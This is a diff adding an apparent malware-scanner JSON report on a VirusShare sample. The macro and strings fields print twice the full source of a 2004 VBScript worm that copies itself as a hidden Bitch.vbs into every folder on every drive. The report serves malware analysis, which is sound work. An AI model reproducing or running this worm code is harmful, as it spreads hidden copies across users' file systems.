@@ -1,0 +1,65 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Write": "May write to a file"
+        },
+        "macro": "'<><><><><><><><><><><><><><>\n'VBS.Bitch.Hole         <><><><>\n'Spidey @ Mei 2004         <><><><>\n'<><><><><><><><><><><><><><><><><><><>\nRandomize :\nOn Error Resume Next\nSet Fso = CreateObject(\"Scripting.FileSystemObject\")\nSet cOde = Fso.OpenTextFile(WScript.ScriptFullName,1)\nVBScript = cOde.ReadAll\ncOde.Close\n\nSet Drives = Fso.Drives\nFor Each Drive in Drives\nIf Drive.isReady then\nSrch Drive & \"\\\"\nEnd If\nNext\n\nSub Srch(HoLe)\nOn Error Resume Next\nIf (Bitch <> HoLe) then\nSet Text = Fso.CreateTextFile(HoLe & \"\\Bitch.vbs\")\nText.Write VBScript\nText.Close\nBitch = HoLe\nSet Att = Fso.GetFile(HoLe & \"\\Bitch.vbs\")\nAtt.Attributes = Att.Attributes + 2\nEnd If\nFor Each Folder in Fso.GetFolder(HoLe).SubFolders\nSrch(Folder.Path)\nNext\nEnd Sub"
+    },
+    "filename": "VirusShare_316bbe72e622922aba4ab7d173a027ab",
+    "filesize": 768,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "316bbe72e622922aba4ab7d173a027ab",
+        "sha1": "57bf3c0884b4c278bca3954289c46b671c0a4bd4",
+        "sha256": "59a42aa5223a6261775e41bd46bc01b08014178e88260a2e899e2db64c21d0c2"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'<><><><><><><><><><><><><><>",
+            "'VBS.Bitch.Hole         <><><><>",
+            "'Spidey @ Mei 2004         <><><><>",
+            "'<><><><><><><><><><><><><><><><><><><>",
+            "Randomize :",
+            "On Error Resume Next",
+            "Set Fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set cOde = Fso.OpenTextFile(WScript.ScriptFullName,1)",
+            "VBScript = cOde.ReadAll",
+            "cOde.Close",
+            "Set Drives = Fso.Drives",
+            "For Each Drive in Drives",
+            "If Drive.isReady then",
+            "Srch Drive & \"\\\"",
+            "End If",
+            "Next",
+            "Sub Srch(HoLe)",
+            "On Error Resume Next",
+            "If (Bitch <> HoLe) then",
+            "Set Text = Fso.CreateTextFile(HoLe & \"\\Bitch.vbs\")",
+            "Text.Write VBScript",
+            "Text.Close",
+            "Bitch = HoLe",
+            "Set Att = Fso.GetFile(HoLe & \"\\Bitch.vbs\")",
+            "Att.Attributes = Att.Attributes + 2",
+            "End If",
+            "For Each Folder in Fso.GetFolder(HoLe).SubFolders",
+            "Srch(Folder.Path)",
+            "Next",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265995",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
